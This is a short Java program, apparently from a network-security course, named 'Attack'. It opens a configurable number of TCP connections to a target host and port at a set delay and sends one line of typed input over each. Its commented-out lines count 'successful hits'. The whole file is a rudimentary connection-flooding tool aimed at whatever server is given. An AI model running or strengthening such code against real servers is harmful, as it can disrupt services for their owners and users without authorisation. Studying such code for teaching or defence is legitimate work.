package networksecurity;

import java.io.*;
import java.net.*;

public class Attack
{
	public static void main(String args[]) throws Exception
	{
		Socket s = null;
                PrintWriter out = null;
                BufferedReader in = null;
		String srv=args[0];
		int port=Integer.parseInt(args[1]);
		int no_of_attack=Integer.parseInt(args[2]);
		int delay_time=Integer.parseInt(args[3]);
		System.out.println("Connection information");
		int stat=0;
		int ctr=0;
		for(ctr=0;ctr<no_of_attack;ctr++)
		{
			System.out.println("Connection no: "+ (ctr+1));
			try
			{
				s=new Socket(srv, port);
				System.out.println("Socket created");
                                out = new PrintWriter(s.getOutputStream(), true);
                                in = new BufferedReader(new InputStreamReader(s.getInputStream()));
				//s.close();
				stat++;
			}
			catch(UnknownHostException e)
			{
				System.out.println("Error in connection..."+e);
			}
                        catch (IOException ie) {
                                System.err.println("Couldn't get I/O for the connection to: localhost");
                                System.exit(1);
                        }
                        BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in));
                        String userInput = stdIn.readLine();
                        out.println(userInput);
                        /*while ((userInput = stdIn.readLine()) != null) {
                            //out.println(userInput);
                            if (userInput.equals(".")) {
                              out.write((char) 0);
                              out.flush();
                            }
                            else {
                              out.println(userInput);
                            }
                        }*/
                        stdIn.close();
			Thread.sleep(delay_time);
		}
                out.close();
                in.close();
                s.close();
		//System.out.println("Report: ");
		//System.out.println("No of sucessfull hit: "+ stat);
		//System.out.println("No of un-sucessfull hit: "+ (no_of_attack-stat));
	}
}